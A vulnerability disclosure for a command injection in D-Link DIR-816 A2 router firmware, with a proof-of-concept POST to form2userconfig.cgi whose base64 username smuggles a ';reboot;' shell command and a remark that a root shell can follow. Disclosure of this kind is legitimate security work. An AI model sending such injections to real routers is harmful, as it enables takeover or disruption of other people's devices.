# D-link DIR-816 A2_v1.10CNB04.img Command injection vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/form2userconfig_cgi/img/vuln1.png)

username and newpass are brought into the dosystem function after base64 decryption, so there is a command injection vulnerability

## Poc

```c
POST /goform/form2userconfig.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 175
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/d_userconfig.asp
Cookie: curShow=
Upgrade-Insecure-Requests: 1

username=JztyZWJvb3Q7Jw==&oldpass=&newpass=bm9uZ25vbmc%3D&confpass=bm9uZ25vbmc%3D&modify=%E4%BF%AE%E6%94%B9&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=1804289383
```

Then you can see that the router will be restarted

Finally can write exp to get root shell
